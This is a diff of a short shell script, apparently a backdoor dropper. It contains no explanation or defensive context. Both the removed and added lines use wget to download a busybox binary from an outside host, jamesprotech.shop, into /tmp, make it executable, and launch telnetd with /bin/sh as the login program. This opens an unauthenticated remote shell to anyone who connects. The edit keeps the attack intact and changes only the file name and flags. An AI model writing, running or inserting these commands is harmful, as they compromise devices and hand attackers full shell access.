@@ -1,5 +1,4 @@
 #!/bin/sh
-wget --no-check-certificate http://jamesprotech.shop/telnet/busybox -O /tmp/busybox
-chmod 0777 /tmp/busybox
-/tmp/busybox telnetd -p 23 -l /bin/sh &
-
+wget http://jamesprotech.shop/telnet/busybox -O /tmp/busyboxx
+chmod +x /tmp/busyboxx
+/tmp/busyboxx telnetd -l /bin/sh
